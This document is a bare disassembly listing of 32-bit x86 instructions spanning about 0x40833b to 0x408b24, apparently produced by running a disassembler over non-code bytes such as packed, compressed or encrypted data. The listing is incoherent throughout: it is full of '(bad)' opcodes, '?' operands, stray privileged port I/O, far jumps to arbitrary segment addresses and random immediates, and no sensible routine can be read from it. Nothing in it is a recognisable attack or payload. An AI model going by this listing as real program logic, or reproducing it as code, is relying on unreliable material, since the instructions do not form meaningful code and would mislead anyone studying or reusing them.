  40833b:	sbb    DWORD PTR [edi],edx
  40833d:	adc    eax,0x227f1d1f
  408342:	add    al,0x8e
  408344:	mov    bh,0xf7
  408346:	std    
  408347:	nop
  408348:	(bad)  
  408349:	fild   DWORD PTR [ebp-0x1bb2e468]
  40834f:	pop    ds
  408350:	test   esp,esi
  408352:	jle    0x4082fc
  408354:	xor    al,0xa9
  408356:	into   
  408357:	dec    esp
  408358:	lock pop ebp
  40835a:	pop    edx
  40835b:	jb     0x40832d
  40835d:	fxch   st(3)
  40835f:	mov    ds:0x2ed7205d,eax
  408364:	inc    ebx
  408365:	pop    ebx
  408366:	popf   
  408367:	push   edi
  408368:	mov    ds:0xc569f17a,al
  40836d:	pmuludq mm2,mm3
  408370:	sbb    al,0xf5
  408372:	fsubr  QWORD PTR [eax]
  408374:	loope  0x40838d
  408376:	fwait
  408377:	repnz mov dl,0xb5
  40837a:	and    al,dh
  40837c:	mov    ah,0x2
  40837e:	scas   eax,DWORD PTR es:[edi]
  40837f:	mov    esp,0x4c6a8257
  408384:	call   0x1569bf14
  408389:	(bad)  
  40838a:	mov    esp,0x5c8dc9ec
  40838f:	mov    ecx,0x9856b42
  408394:	sbb    DWORD PTR [ebx-0xa],esp
  408397:	call   0x1788314a
  40839c:	test   eax,0xfcb5cb2f
  4083a1:	inc    edi
  4083a2:	paddw  mm0,QWORD PTR [esi]
  4083a5:	add    ebp,ebx
  4083a7:	fisub  DWORD PTR [ebx-0x5]
  4083aa:	ret    0x5eba
  4083ad:	pandn  mm4,QWORD PTR [edi-0x66]
  4083b1:	cmp    eax,0x4bd247f1
  4083b6:	popa   
  4083b7:	push   0xfe62638
  4083bc:	mov    cl,0x7a
  4083be:	mov    bh,0x72
  4083c0:	js     0x408390
  4083c2:	xor    bl,BYTE PTR [esi]
  4083c4:	sti    
  4083c5:	loop   0x40841c
  4083c7:	pop    esi
  4083c8:	scas   eax,DWORD PTR es:[edi]
  4083c9:	mov    bh,0x80
  4083cb:	jmp    0xe45e:0x5bc1da43
  4083d2:	out    0xee,al
  4083d4:	xchg   esp,eax
  4083d5:	xchg   DWORD PTR [eax],edx
  4083d7:	or     BYTE PTR [eax+0x46],bh
  4083da:	leave  
  4083db:	clc    
  4083dc:	sbb    DWORD PTR [ebx],esi
  4083de:	out    dx,al
  4083df:	push   edx
  4083e0:	jnp    0x408438
  4083e2:	repnz mov ah,0x4e
  4083e5:	les    edx,FWORD PTR [eax+0x1e]
  4083e8:	(bad)  ds:0x636855a1
  4083ee:	and    DWORD PTR [ebp-0x68],edx
  4083f1:	popa   
  4083f2:	add    DWORD PTR [ecx-0x6b54bd5f],esi
  4083f8:	or     BYTE PTR [edi-0x4fba0ed8],dh
  4083fe:	gs xchg esp,eax
  408400:	jp     0x408452
  408402:	dec    esi
  408403:	hlt    
  408404:	pop    eax
  408405:	mov    eax,0xe13ef4d3
  40840b:	mov    BYTE PTR [ebp-0x2b34530b],bh
  408411:	loope  0x408454
  408413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408414:	(bad)  
  408415:	fcomp  QWORD PTR [edi]
  408417:	outs   dx,DWORD PTR ds:[esi]
  408418:	popf   
  408419:	repnz add BYTE PTR [edi],dh
  40841c:	(bad)
  40841f:	dec    esp
  408420:	imul   DWORD PTR [eax-0x3c]
  408423:	in     eax,0x1e
  408425:	or     ch,BYTE PTR ds:0x44b3434c
  40842b:	cli    
  40842c:	jns    0x4083b9
  40842e:	mov    edi,0x4fe12dea
  408433:	adc    ecx,DWORD PTR ss:[ebx-0x59]
  408437:	mov    dl,0x10
  408439:	mov    ebx,0x155cb74a
  40843e:	mov    ds:0xba20d00c,eax
  408443:	sahf   
  408444:	dec    eax
  408445:	clc    
  408446:	mov    edx,0x59138f0
  40844b:	jns    0x408452
  40844d:	pop    ecx
  40844e:	push   ecx
  40844f:	push   edi
  408450:	xchg   ecx,eax
  408451:	mov    al,BYTE PTR cs:[esi-0x55]
  408455:	popa   
  408456:	add    al,0xac
  408458:	mov    eax,ds:0xe7add085
  40845d:	pushf  
  40845e:	sub    BYTE PTR [eax+0x1c],bl
  408461:	add    dh,dh
  408463:	out    0xb2,eax
  408465:	mov    eax,0x71158a0e
  40846a:	jbe    0x4084ea
  40846c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40846d:	xchg   edx,eax
  40846e:	stos   DWORD PTR es:[edi],eax
  40846f:	jnp    0x4084ae
  408471:	mov    ?,ebp
  408473:	ins    BYTE PTR es:[edi],dx
  408474:	add    eax,0x51442b81
  408479:	pop    edi
  40847a:	adc    eax,0x699a3698
  40847f:	sub    DWORD PTR [ecx+0xd],edx
  408482:	gs (bad) 
  408484:	pop    esp
  408485:	inc    ebx
  408486:	data16 clc 
  408488:	lds    eax,FWORD PTR [esi-0x1f4a8bd2]
  40848e:	jp     0x408472
  408490:	shl    BYTE PTR [ecx+0x2df93b91],cl
  408496:	test   eax,0x141944f
  40849b:	gs sahf 
  40849d:	mov    ecx,0x85c6022d
  4084a2:	xchg   BYTE PTR [ecx],bh
  4084a4:	sub    eax,0xd174f390
  4084a9:	jb     0x408453
  4084ab:	ds pop edx
  4084ad:	rol    BYTE PTR [ebx+0x5097c9fe],cl
  4084b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084b4:	push   cs
  4084b5:	movq   mm1,mm3
  4084b8:	pusha  
  4084b9:	or     eax,0xbc3b5891
  4084be:	xor    al,0x61
  4084c0:	inc    ecx
  4084c1:	mov    BYTE PTR [eax-0xd360bb2],0xad
  4084c8:	add    DWORD PTR [edi],ebp
  4084ca:	sub    DWORD PTR [edi+0x32],ebp
  4084cd:	mov    BYTE PTR [ecx+0x2a],al
  4084d0:	add    esi,ebx
  4084d2:	or     BYTE PTR [esi],dh
  4084d4:	or     al,0x21
  4084d6:	dec    eax
  4084d7:	ds ins DWORD PTR es:[edi],dx
  4084d9:	ja     0x408488
  4084db:	addr16 cmp edi,eax
  4084de:	hlt    
  4084df:	push   es
  4084e0:	dec    ebx
  4084e1:	xchg   edi,eax
  4084e2:	fistp  WORD PTR [edi]
  4084e4:	and    dl,0x89
  4084e7:	in     al,dx
  4084e8:	sub    esp,ebp
  4084ea:	div    dl
  4084ec:	into   
  4084ed:	out    dx,eax
  4084ee:	inc    ebx
  4084ef:	inc    esi
  4084f0:	mov    esi,esp
  4084f2:	or     al,BYTE PTR [ebx-0xe1e3079]
  4084f8:	movd   DWORD PTR [ebp+eiz*4-0x38],mm1
  4084fd:	dec    ebx
  4084fe:	inc    ebx
  4084ff:	es int3 
  408501:	rcl    bl,0x80
  408504:	push   eax
  408505:	shl    DWORD PTR [edx],1
  408507:	hlt    
  408508:	pop    ds
  408509:	mov    eax,0xb9df01c8
  40850e:	push   ecx
  40850f:	jg     0x4084ad
  408511:	cwde   
  408512:	mov    WORD PTR [eax+0x29e7687d],?
  408518:	into   
  408519:	jmp    0x2b64ec57
  40851e:	mov    dh,0x75
  408521:	push   eax
  408522:	mov    ebx,0x9415fcb4
  408527:	mov    ecx,0x695038ba
  40852c:	cld    
  40852d:	add    eax,0x51ac1ea5
  408532:	shr    BYTE PTR [eax],cl
  408534:	enter  0x4521,0x4e
  408538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408539:	and    edx,DWORD PTR [edx+0x10]
  40853c:	aam    0x4
  40853e:	popf   
  40853f:	cmp    bh,al
  408541:	dec    ebx
  408542:	jmp    0x408506
  408544:	xor    dh,BYTE PTR [eax-0x79616716]
  40854a:	(bad)  
  40854b:	lea    ebx,[esi-0x72355659]
  408551:	(bad)  
  408552:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408553:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408554:	and    eax,DWORD PTR ds:0xb241aeb4
  40855a:	mov    eax,ds:0x7088d4b8
  40855f:	jnp    0x4084e7
  408561:	sbb    DWORD PTR [esi-0x6e],0xffffffb5
  408565:	dec    DWORD PTR [ebp+0x74]
  408568:	lods   al,BYTE PTR ds:[esi]
  408569:	retf   0xba33
  40856c:	dec    esp
  40856d:	jmp    0x408513
  40856f:	(bad)  
  408570:	and    ah,BYTE PTR [ebx]
  408572:	sbb    bh,dl
  408574:	or     al,0x9e
  408576:	fwait
  408577:	jecxz  0x4085a4
  408579:	jns    0x408561
  40857b:	jae    0x40852b
  40857d:	mov    edx,0x74708fdf
  408582:	icebp  
  408583:	fistp  DWORD PTR [ecx+0x30]
  408586:	xchg   esp,eax
  408587:	data16 int3 
  408589:	stc    
  40858a:	in     eax,dx
  40858b:	add    al,0x9d
  40858d:	dec    ecx
  40858e:	or     ah,BYTE PTR [edi]
  408590:	mov    BYTE PTR [ecx+0x52312274],dh
  408596:	ds stc 
  408598:	or     al,0x6f
  40859a:	ins    BYTE PTR es:[edi],dx
  40859b:	adc    ebp,0x92af9a6b
  4085a1:	les    edx,FWORD PTR [ebx]
  4085a3:	jno    0x408601
  4085a5:	out    dx,al
  4085a6:	popf   
  4085a7:	add    BYTE PTR [edi+ecx*4],0x8e
  4085ab:	mov    edx,0xff78b8fe
  4085b0:	jecxz  0x4085db
  4085b2:	iret   
  4085b3:	mov    eax,ds:0x750e0176
  4085b8:	cmp    DWORD PTR [eax],edx
  4085ba:	stc    
  4085bb:	jge    0x40856c
  4085bd:	mov    al,0xf5
  4085bf:	push   ecx
  4085c0:	sbb    DWORD PTR [esi+edx*8+0x1548c2f1],0xffffffb8
  4085c8:	nop
  4085c9:	jmp    0x408644
  4085cb:	pop    ebx
  4085cc:	jnp    0x40857d
  4085ce:	sbb    DWORD PTR [ebx+0x1e82ad7e],ecx
  4085d4:	scas   al,BYTE PTR es:[edi]
  4085d5:	push   cs
  4085d6:	cdq    
  4085d7:	pop    esi
  4085d8:	mov    ecx,DWORD PTR [ebx+0x48]
  4085db:	fmul   QWORD PTR [ebp-0x13808b00]
  4085e1:	mov    WORD PTR [edi-0x139b96be],fs
  4085e7:	push   esp
  4085e8:	add    al,0xe7
  4085ea:	adc    al,0x7f
  4085ec:	das    
  4085ed:	test   BYTE PTR [edx-0xf418d9f],dh
  4085f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085f4:	mov    bl,0x75
  4085f6:	jae    0x408660
  4085f8:	leave  
  4085f9:	inc    eax
  4085fa:	and    eax,0x1d21302b
  4085ff:	sub    al,0x8e
  408601:	jne    0x4085af
  408603:	pushf  
  408604:	into   
  408605:	adc    dl,dl
  408607:	cmp    DWORD PTR ds:0x16086c76,esi
  40860d:	add    ebx,DWORD PTR [esi+0x333f2320]
  408613:	jno    0x40866a
  408615:	ja     0x4085f7
  408617:	(bad)  
  408618:	fucomp st(7)
  40861a:	cdq    
  40861b:	sbb    eax,0x7b7b556e
  408620:	scas   eax,DWORD PTR es:[edi]
  408621:	adc    BYTE PTR [edi],bl
  408623:	push   ecx
  408624:	fnsave [ebx+0x14]
  408627:	adc    cl,BYTE PTR [edi-0x63]
  40862a:	mov    ch,0xad
  40862c:	xchg   ebp,eax
  40862d:	ss ror edx,cl
  408630:	pusha  
  408631:	mov    ah,0x15
  408633:	mov    ebp,0xd4ecb0a4
  408638:	pop    esi
  408639:	sbb    al,0x8b
  40863b:	xor    bl,bl
  40863d:	mov    ecx,0x2cec44b1
  408642:	xchg   ebp,eax
  408643:	inc    edi
  408644:	fisub  DWORD PTR [edi]
  408646:	and    eax,0xca89a454
  40864b:	push   edi
  40864c:	(bad)  
  40864d:	mov    ebx,0x8eef8a3d
  408652:	(bad)  
  408653:	sbb    al,0xaf
  408655:	ret    0x5c8b
  408658:	imul   edi,DWORD PTR [esi+0x3b29d4bf],0x539b3a5c
  408662:	mov    ebp,DWORD PTR [edi+edx*4-0x21]
  408666:	popf   
  408667:	inc    esp
  408668:	xchg   ebx,eax
  408669:	dec    ecx
  40866a:	push   ebx
  40866b:	push   ds
  40866c:	aad    0xce
  40866e:	outs   dx,DWORD PTR ds:[esi]
  40866f:	out    0xb3,eax
  408671:	and    BYTE PTR [ebx+0x47056642],bh
  408677:	xchg   esi,eax
  408678:	cmp    DWORD PTR [esi+eiz*4-0x7494b28],edi
  40867f:	add    al,BYTE PTR [ebx]
  408681:	lods   al,BYTE PTR ds:[esi]
  408682:	mov    dh,0xd7
  408684:	pop    ebx
  408685:	jecxz  0x40860f
  408687:	nop
  408688:	and    al,0xa6
  40868a:	inc    ebp
  40868b:	and    BYTE PTR [esi],dl
  40868d:	fmul   QWORD PTR [ebp+0x2d7ee3b1]
  408693:	ins    DWORD PTR es:[edi],dx
  408694:	xor    eax,0x4f225d6a
  408699:	add    eax,0xc58d9ba4
  40869e:	scas   al,BYTE PTR es:[edi]
  40869f:	add    BYTE PTR [ebp-0x1f],bh
  4086a2:	xchg   edx,eax
  4086a3:	call   0x82b7:0x1222949
  4086aa:	out    dx,eax
  4086ab:	xchg   ebx,eax
  4086ac:	push   ebp
  4086ad:	inc    ecx
  4086ae:	aam    0xc0
  4086b0:	ret    0xb943
  4086b3:	mov    ebp,0xe7ad2416
  4086b8:	push   0x3d0f6f1
  4086bd:	add    WORD PTR [ebx+0xd434dde],0xb0ef
  4086c6:	and    eax,DWORD PTR [ecx+0x60]
  4086c9:	call   0xe2fda009
  4086ce:	pop    ebx
  4086cf:	test   BYTE PTR ds:0xae35e493,ch
  4086d5:	adc    BYTE PTR [eax],al
  4086d7:	js     0x408754
  4086d9:	fldcw  WORD PTR [ebx]
  4086db:	(bad)  
  4086dd:	inc    eax
  4086de:	imul   edx,DWORD PTR [edi],0xa7341066
  4086e4:	imul   ebx,eax,0xe805529e
  4086ea:	inc    ebp
  4086eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086ec:	jp     0x4086ad
  4086ee:	and    eax,0xdeffbd45
  4086f3:	fs jl  0x40867a
  4086f6:	xchg   BYTE PTR [ebx],bl
  4086f8:	or     eax,0x53793f3c
  4086fd:	retf   
  4086fe:	pop    ebx
  4086ff:	aaa    
  408700:	sar    DWORD PTR [esi+0x52e8656b],1
  408706:	imul   eax,DWORD PTR [eax*2-0x55d4eb48],0xffffffb9
  40870e:	fnstenv [esi+0x4d]
  408711:	xor    bl,BYTE PTR [ebx]
  408713:	pop    esp
  408714:	(bad)  
  408715:	out    0xa2,al
  408717:	xchg   dl,bh
  408719:	stos   DWORD PTR es:[edi],eax
  40871a:	loopne 0x408793
  40871c:	jmp    0x408745
  40871e:	mov    ebp,0xc7ca9b2c
  408723:	scas   eax,DWORD PTR es:[edi]
  408724:	mov    eax,0x56a22945
  408729:	shr    cl,cl
  40872b:	mov    edi,0x668da9ac
  408730:	(bad)  
  408731:	pop    esi
  408732:	adc    DWORD PTR [ebp+0x2],ebx
  408735:	lea    esi,[ecx+eiz*2+0x64]
  408739:	mov    edi,DWORD PTR [edx]
  40873b:	lods   ax,WORD PTR ds:[esi]
  40873d:	mov    edi,0x92867305
  408742:	test   DWORD PTR [ebx],0x60495219
  408748:	rcr    DWORD PTR es:[esi+0x44cadf97],1
  40874f:	mov    esi,0xc272beaa
  408754:	pop    es
  408755:	addr16 xchg edi,eax
  408757:	lahf   
  408758:	pop    es
  408759:	dec    eax
  40875a:	test   al,0x59
  40875c:	push   es
  40875d:	out    dx,eax
  40875e:	sub    al,0x85
  408760:	mov    dl,BYTE PTR [edx]
  408762:	test   eax,0xd943c02e
  408767:	outs   dx,DWORD PTR ds:[esi]
  408768:	adc    DWORD PTR [ebp+0x2c658711],ebx
  40876e:	hlt    
  40876f:	inc    ecx
  408770:	xor    DWORD PTR gs:[ebx-0x11b6931f],esi
  408777:	and    ebp,DWORD PTR [ebp+0x70b88c35]
  40877d:	jae    0x408796
  40877f:	ret    
  408780:	and    al,0x95
  408782:	(bad)  
  408783:	rcr    BYTE PTR [edi+edx*1+0x42a1389e],0x2c
  40878b:	jmp    0x7e0c:0x1df6a35
  408792:	hlt    
  408793:	shr    BYTE PTR [esp+edx*2-0x3c523c69],1
  40879a:	fcomip st,st(4)
  40879c:	sti    
  40879d:	mov    dl,0x35
  40879f:	mov    DWORD PTR [ebx+0x61494241],edx
  4087a5:	sbb    eax,0xdbf116bc
  4087aa:	std    
  4087ab:	sub    bh,dl
  4087ad:	push   ebx
  4087ae:	stos   DWORD PTR es:[edi],eax
  4087af:	sar    DWORD PTR [edx],0xf3
  4087b2:	push   edi
  4087b3:	xor    DWORD PTR [ecx],edx
  4087b5:	mov    esp,0xda777842
  4087ba:	mov    DWORD PTR [esi],ecx
  4087bc:	iret   
  4087bd:	popa   
  4087be:	adc    edi,ebp
  4087c0:	and    eax,0x7db10a71
  4087c5:	js     0x408793
  4087c7:	aam    0x88
  4087c9:	jo     0x3e3c5a65
  4087cf:	mov    ebp,0x99cbcc83
  4087d4:	pop    ebp
  4087d5:	dec    ebp
  4087d6:	xchg   BYTE PTR [edx+0x318c59e5],al
  4087dc:	fwait
  4087dd:	bound  ecx,QWORD PTR [edi-0x596a7aee]
  4087e3:	inc    DWORD PTR [eax]
  4087e5:	repz arpl cx,si
  4087e8:	loopne 0x40876e
  4087ea:	jns    0x4087fb
  4087ec:	pop    ds
  4087ed:	sub    ax,0xaf4c
  4087f1:	mov    al,ds:0xa92bf146
  4087f6:	and    BYTE PTR [edx+eax*4-0x43],al
  4087fa:	jmp    0x40879b
  4087fc:	outs   dx,BYTE PTR ds:[esi]
  4087fd:	test   DWORD PTR [ebx],esi
  4087ff:	loop   0x40880d
  408801:	in     al,dx
  408802:	or     bl,BYTE PTR [edi+0x361ceade]
  408808:	out    0xe0,eax
  40880a:	push   ds
  40880b:	lods   al,BYTE PTR fs:[esi]
  40880d:	add    DWORD PTR [ebp-0x3e],ecx
  408810:	mov    cl,0x79
  408812:	mov    dh,BYTE PTR [edi+0x81de7b9]
  408818:	and    al,0x39
  40881a:	push   ebx
  40881b:	mov    al,ds:0x2af9734a
  408820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408821:	in     eax,0x89
  408823:	ja     0x408870
  408825:	push   ebx
  408826:	jae    0x408839
  408828:	popa   
  408829:	mov    al,ds:0xa8b1fa02
  40882e:	inc    edi
  40882f:	push   0x69
  408831:	stos   BYTE PTR es:[edi],al
  408832:	xchg   esp,eax
  408833:	mov    edi,0xd0c34322
  408838:	and    eax,0x9956f2de
  40883d:	mov    ds:0xa52ae4c6,al
  408842:	mov    dh,0x62
  408844:	int3   
  408845:	lahf   
  408846:	aad    0x68
  408848:	test   BYTE PTR [ebx-0x2faf95a],ah
  40884e:	fnsave ds:0x3e0572c8
  408854:	mov    fs,edx
  408856:	mov    ecx,0xe2e509b
  40885b:	in     al,dx
  40885c:	mov    dl,0x2c
  40885e:	hlt    
  40885f:	sub    eax,0xb967b1d9
  408864:	ret    0xa904
  408867:	add    DWORD PTR [ebx+0x68],ecx
  40886a:	adc    dh,BYTE PTR [edi]
  40886c:	test   al,0x84
  40886e:	retf   
  40886f:	mov    edx,0xad21fa81
  408874:	xor    esp,DWORD PTR [edx]
  408876:	repz je 0x40886c
  408879:	test   eax,0x5675ca4d
  40887e:	jmp    FWORD PTR gs:[ecx+0x7d]
  408882:	ror    BYTE PTR [esi+0x4e],0x96
  408886:	arpl   WORD PTR [ebx+edi*4],di
  408889:	adc    al,BYTE PTR [ecx-0x1]
  40888c:	push   ebp
  40888d:	repz add BYTE PTR [ebx+0x3d222909],bh
  408894:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408895:	lea    eax,[edx]
  408897:	jae    0x408908
  408899:	pop    ds
  40889a:	mov    ?,ebp
  40889c:	ret    
  40889d:	cmp    esp,ebx
  40889f:	std    
  4088a0:	sbb    dl,BYTE PTR [edx+0x105bd0ac]
  4088a6:	sti    
  4088a7:	inc    esi
  4088a8:	stc    
  4088a9:	inc    ebx
  4088aa:	pop    ebx
  4088ab:	into   
  4088ac:	jbe    0x408900
  4088ae:	jg     0x408899
  4088b0:	add    ch,BYTE PTR ds:0x456aa8fa
  4088b6:	mov    ah,0x87
  4088b8:	adc    al,0xa9
  4088ba:	pop    edi
  4088bb:	sahf   
  4088bc:	dec    esp
  4088bd:	cmp    DWORD PTR [ebp-0x33d955fe],esp
  4088c3:	mov    esp,0xbb0e6293
  4088c8:	test   DWORD PTR [ecx+0x38],ecx
  4088cb:	jp     0x40894c
  4088cd:	sub    DWORD PTR [esi-0xd],0x2dcb4004
  4088d4:	mov    ebx,?
  4088d6:	popa   
  4088d7:	arpl   WORD PTR [ebx],cx
  4088d9:	or     ebp,DWORD PTR [esp+ecx*8+0x36]
  4088dd:	jno    0x40890b
  4088df:	mov    al,ds:0x74df98cd
  4088e4:	jno    0x4088c5
  4088e6:	gs retf 
  4088e8:	jmp    DWORD PTR [edi+0x7b8408f]
  4088ee:	cmp    ch,ah
  4088f0:	cwde   
  4088f1:	cs jecxz 0x4088c4
  4088f4:	fcom   QWORD PTR [ecx+0x32]
  4088f7:	jmp    0x4088eb
  4088f9:	cmp    DWORD PTR [edx+0x329e1d62],esi
  4088ff:	and    DWORD PTR [edx+0x3e399e78],eax
  408905:	mov    dl,0x5e
  408907:	cmp    BYTE PTR [ecx+0x69],ah
  40890a:	lods   al,BYTE PTR ds:[esi]
  40890b:	pushf  
  40890c:	or     DWORD PTR [ebp-0x67],0xffffffd6
  408910:	(bad)  
  408911:	(bad)
  408914:	fs mov eax,0x2c612b18
  40891a:	je     0x408948
  40891c:	idiv   DWORD PTR [edi+0x6dd103aa]
  408922:	hlt    
  408923:	(bad)  
  408925:	clc    
  408926:	mov    al,ds:0x11c8085a
  40892b:	dec    edx
  40892c:	xchg   ecx,eax
  40892d:	cmp    BYTE PTR [ecx-0x6c421f6d],0x6e
  408934:	xor    dl,BYTE PTR [ecx-0x4920f12c]
  40893a:	push   ebx
  40893b:	mov    bh,0xe4
  40893d:	psllq  mm6,mm6
  408940:	out    0xe,al
  408942:	sub    al,0x68
  408944:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408946:	xchg   al,dl
  408948:	mov    dl,0xa3
  40894a:	shl    BYTE PTR [ebp+0x698de42f],cl
  408950:	loop   0x40897a
  408952:	imul   ebp,DWORD PTR [ebp-0x42d9efc2],0x77
  408959:	inc    BYTE PTR [esi+0x85a94a9]
  40895f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408960:	int3   
  408961:	lock sbb ah,dh
  408964:	push   eax
  408965:	jge    0x40895c
  408967:	loopne 0x4089b9
  408969:	fincstp 
  40896b:	ret    0x191d
  40896e:	(bad)  
  40896f:	jle    0x408922
  408971:	not    DWORD PTR [ebp+0x38be53e9]
  408977:	mov    edx,0xd0f9806e
  40897c:	jbe    0x40898d
  40897e:	not    BYTE PTR [edx+0x29]
  408981:	jae    0x4089bf
  408983:	cmp    al,0x12
  408985:	xor    DWORD PTR [ecx-0x2c],esp
  408988:	pop    ds
  408989:	push   ds
  40898a:	lods   eax,DWORD PTR ds:[esi]
  40898b:	sub    ebx,DWORD PTR [edi]
  40898d:	fmul   DWORD PTR [edx]
  40898f:	in     eax,0x6d
  408991:	pop    ecx
  408992:	clc    
  408993:	xchg   esp,eax
  408994:	aaa    
  408995:	iret   
  408996:	retf   
  408997:	sub    DWORD PTR [edx-0x24a6ce9c],edi
  40899d:	or     dl,BYTE PTR [ebx]
  40899f:	rcr    BYTE PTR [esi-0x3154c085],1
  4089a5:	sub    BYTE PTR [edx+0x5f],al
  4089a8:	retf   
  4089a9:	adc    esi,edx
  4089ab:	nop
  4089ac:	and    dl,BYTE PTR [ebx]
  4089ae:	or     DWORD PTR [esi-0x12c3aa51],esi
  4089b4:	fcom   DWORD PTR [ecx-0x8f7da03]
  4089ba:	out    dx,eax
  4089bb:	jp     0x4089cf
  4089bd:	adc    al,0xcf
  4089bf:	mov    BYTE PTR ds:0x635151fd,al
  4089c5:	mov    edx,0xe3ebe5b9
  4089ca:	scas   eax,DWORD PTR es:[edi]
  4089cb:	or     BYTE PTR [ebx+0x199f8396],al
  4089d1:	enter  0xb89c,0x22
  4089d5:	stos   DWORD PTR es:[edi],eax
  4089d6:	mov    bl,0xb8
  4089d8:	or     DWORD PTR [ecx],edx
  4089da:	mov    dl,0xf4
  4089dc:	inc    edx
  4089dd:	or     ebx,esi
  4089df:	push   cs
  4089e0:	push   edx
  4089e1:	push   edi
  4089e2:	mov    edx,0xcd22d788
  4089e7:	clc    
  4089e8:	dec    ecx
  4089e9:	jl     0x408974
  4089eb:	inc    ebx
  4089ec:	pop    ebx
  4089ed:	pusha  
  4089ee:	jb     0x408a0b
  4089f0:	loopne 0x408a15
  4089f2:	push   0xffffffef
  4089f4:	mov    DWORD PTR [ebp-0x27aa26c0],0xbef7e113
  4089fe:	sbb    DWORD PTR [esi],eax
  408a00:	(bad)  
  408a01:	push   esp
  408a02:	lods   al,BYTE PTR ds:[esi]
  408a03:	or     al,0xd6
  408a05:	jb     0x408a2d
  408a07:	cld    
  408a08:	jae    0x408a83
  408a0a:	xor    esi,esi
  408a0c:	jae    0x408a50
  408a0e:	dec    edx
  408a0f:	mov    edx,0xdb4e9c94
  408a14:	xchg   edx,eax
  408a15:	(bad)  
  408a16:	xor    edx,esp
  408a18:	(bad)  
  408a19:	mov    dh,0xf2
  408a1b:	(bad)  
  408a1c:	(bad)  
  408a1d:	mov    ecx,0xc6f7e4ae
  408a22:	aad    0xd7
  408a24:	xor    ebp,DWORD PTR [ebx-0x422f21a0]
  408a2a:	sahf   
  408a2b:	(bad)  
  408a2c:	aas    
  408a2d:	or     al,0xf7
  408a2f:	sbb    al,BYTE PTR [ebx+eiz*8-0x4f]
  408a33:	dec    ebp
  408a34:	sbb    bh,BYTE PTR [esi]
  408a36:	dec    esi
  408a37:	pop    es
  408a38:	dec    esp
  408a39:	dec    esi
  408a3a:	xchg   ecx,eax
  408a3b:	mov    edi,0x9ab2af48
  408a40:	std    
  408a41:	adc    eax,DWORD PTR [edx]
  408a43:	pushf  
  408a44:	mov    al,0x29
  408a46:	push   edi
  408a47:	shr    dh,cl
  408a49:	or     al,0xb5
  408a4b:	mov    esp,0xcd2d7d96
  408a50:	outs   dx,BYTE PTR ds:[esi]
  408a51:	clc    
  408a52:	dec    ebp
  408a53:	push   ds
  408a54:	pop    esp
  408a55:	scas   eax,DWORD PTR es:[edi]
  408a56:	icebp  
  408a57:	mov    esi,0x6757e173
  408a5c:	jl     0x408a7a
  408a5e:	bound  eax,QWORD PTR [edx]
  408a60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a61:	or     eax,0x5d54cfd1
  408a66:	mov    bl,0x3
  408a68:	inc    edi
  408a69:	push   ebp
  408a6a:	cmp    BYTE PTR [edx],ah
  408a6c:	xchg   edi,eax
  408a6d:	push   ebp
  408a6e:	stc    
  408a6f:	lods   eax,DWORD PTR ds:[esi]
  408a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a71:	cli    
  408a72:	ret    0xe895
  408a75:	iret   
  408a76:	sar    bh,1
  408a78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a79:	test   BYTE PTR [ebp+0x4ed8c78e],cl
  408a7f:	icebp  
  408a80:	adc    edi,esp
  408a82:	js     0x408ac8
  408a84:	dec    ecx
  408a85:	sbb    DWORD PTR [edi+eiz*8],esi
  408a88:	(bad)  
  408a89:	xchg   edx,eax
  408a8a:	sub    eax,0xbae95820
  408a8f:	inc    esi
  408a90:	or     DWORD PTR [ebp+ebx*8-0x45],0x7f
  408a95:	out    0xbb,eax
  408a97:	ja     0x408a37
  408a99:	inc    ebp
  408a9a:	out    dx,al
  408a9b:	cmp    ebx,DWORD PTR [ecx]
  408a9d:	popf   
  408a9e:	cdq    
  408a9f:	pop    ds
  408aa0:	push   ebx
  408aa1:	jmp    0x408ac9
  408aa3:	xor    al,0x23
  408aa5:	cdq    
  408aa6:	lahf   
  408aa7:	neg    BYTE PTR [edi+0x4781f5c0]
  408aad:	jo     0x408aa6
  408aaf:	int3   
  408ab0:	mov    ds:0x18b5541b,eax
  408ab5:	mov    al,ds:0xf69fc044
  408aba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408abb:	cmp    DWORD PTR [esi-0x7c453b8e],eax
  408ac1:	jmp    FWORD PTR [edi]
  408ac3:	mov    al,BYTE PTR [eax+edi*4]
  408ac6:	out    dx,al
  408ac7:	xchg   cl,cl
  408ac9:	mov    esi,0x9b18d69
  408ace:	call   DWORD PTR [edi-0x1f]
  408ad1:	jl     0x408af1
  408ad3:	mov    edx,0xaccacdb4
  408ad8:	and    BYTE PTR [esi+0x243c203b],ah
  408ade:	(bad)  
  408adf:	sub    ebx,DWORD PTR [eax-0x22]
  408ae2:	xchg   ebx,eax
  408ae3:	mov    esi,0x36c62c01
  408ae8:	jmp    0xc6d:0x5ed2a18
  408aef:	sub    eax,0xe6bb133e
  408af4:	sub    DWORD PTR [eax],eax
  408af6:	aaa    
  408af7:	pop    esi
  408af8:	out    dx,al
  408af9:	cwde   
  408afa:	xor    DWORD PTR [eax],0x8e6ef3f7
  408b00:	es sti 
  408b02:	call   0xa4d7:0xa8ee67b
  408b09:	in     eax,0x3f
  408b0b:	dec    ebx
  408b0c:	cmp    esp,eax
  408b0e:	dec    ebp
  408b0f:	outs   dx,DWORD PTR ds:[esi]
  408b10:	mov    esp,0x12eb2a1b
  408b15:	add    BYTE PTR [edi+0x6b],0xa1
  408b19:	into   
  408b1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b1b:	imul   BYTE PTR [ecx]
  408b1d:	js     0x408acf
  408b1f:	pop    edi
  408b20:	out    0xbe,eax
  408b22:	or     al,0xf1
  408b24:	repz mov fs,WORD PTR [ecx+0x2a93e5e0]
